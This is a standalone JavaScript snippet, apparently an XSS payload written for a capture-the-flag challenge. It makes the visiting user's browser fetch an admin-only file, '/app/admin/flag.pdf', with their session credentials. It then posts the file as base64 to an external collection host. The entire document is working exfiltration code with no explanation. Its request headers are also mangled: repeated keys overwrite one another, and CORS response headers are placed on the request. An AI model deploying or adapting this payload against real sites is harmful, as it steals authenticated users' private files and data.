(function(){
    const flagUrl = '/app/admin/flag.pdf';
    const webhookUrl = 'https://wechatapp.xsm756.xyz/upload/';

    fetch(flagUrl, { credentials: 'include' })
      .then(response => response.blob())
      .then(blob => {
          const reader = new FileReader();
          reader.onloadend = function() {
              const pdfData = reader.result;
              fetch(webhookUrl, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  headers: { 'Access-Control-Allow-Origin': '*' },
                  headers: { 'Access-Control-Allow-Methods': 'POST, OPTIONS' },
                  headers: { 'Access-Control-Allow-Headers': 'Content-Type' },
                  body: JSON.stringify({ pdf: pdfData })
              });
          };
          reader.readAsDataURL(blob);
      })
      .catch(console.error);
})();
